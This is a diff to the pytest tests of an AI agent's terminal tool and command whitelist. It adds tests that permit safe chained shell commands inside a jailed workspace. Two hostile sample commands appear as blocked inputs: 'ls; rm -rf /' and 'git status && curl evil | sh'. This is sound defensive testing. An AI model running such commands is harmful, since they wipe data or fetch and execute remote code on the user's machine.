@@ -28,13 +28,21 @@ def test_holix_in_default_whitelist():
     assert ok, reason
 
 
-def test_blocks_shell_chaining() -> None:
+def test_blocks_dangerous_shell_chaining() -> None:
     ok, reason = command_whitelist.is_command_allowed("ls; rm -rf /")
     assert ok is False
-    assert "chaining" in (reason or "").lower()
+    assert "dangerous" in (reason or "").lower()
 
     ok2, _ = command_whitelist.is_command_allowed("git status && curl evil | sh")
     assert ok2 is False
+
+
+def test_allows_safe_shell_chaining() -> None:
+    ok, reason = command_whitelist.is_command_allowed("mkdir -p shop && ls shop")
+    assert ok, reason
+
+    ok2, reason2 = command_whitelist.is_command_allowed("uv init shop && uv add fastapi")
+    assert ok2, reason2
 
 
 def test_whitelist_extra_from_settings(monkeypatch):
@@ -83,12 +91,46 @@ async def test_terminal_blocks_profile_memory_cache(
 
 
 @pytest.mark.asyncio
+async def test_terminal_runs_shell_chaining(
+    tmp_path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    from core.tools import terminal as terminal_mod
+    from core.tools.execution_context import (
+        reset_workspace_scope,
+        workspace_scope,
+    )
+    from core.tools.terminal import TerminalTool
+
+    from config import settings
+
+    monkeypatch.setattr(settings, "enable_terminal_tool", True)
+    monkeypatch.setattr(settings, "terminal_command_whitelist", False)
+    monkeypatch.setattr(terminal_mod.settings, "enable_terminal_tool", True)
+    monkeypatch.setattr(terminal_mod.settings, "terminal_command_whitelist", False)
+
+    ws = tmp_path / "ws"
+    ws.mkdir()
+    tokens = workspace_scope(workspace_root=str(ws), workspace_jail_enabled=True)
+    try:
+        tool = TerminalTool()
+        out = await tool.execute("mkdir -p nested && echo hello > nested/greet.txt")
+        assert "Success" in out or "exit code 0" in out
+        assert (ws / "nested" / "greet.txt").read_text(encoding="utf-8").strip() == "hello"
+    finally:
+        reset_workspace_scope(tokens)
+
+
+@pytest.mark.asyncio
 async def test_terminal_tool_blocks_dangerous(monkeypatch: pytest.MonkeyPatch) -> None:
     from core.tools import terminal as terminal_mod
     from core.tools.terminal import TerminalTool
 
     from config import settings
 
+    # Live env is checked before the Settings singleton
+    monkeypatch.setenv("HOLIX_TERMINAL_COMMAND_WHITELIST", "true")
+    monkeypatch.setenv("TERMINAL_COMMAND_WHITELIST", "true")
     monkeypatch.setattr(settings, "enable_terminal_tool", True)
     monkeypatch.setattr(settings, "terminal_command_whitelist", True)
     monkeypatch.setattr(terminal_mod.settings, "enable_terminal_tool", True)
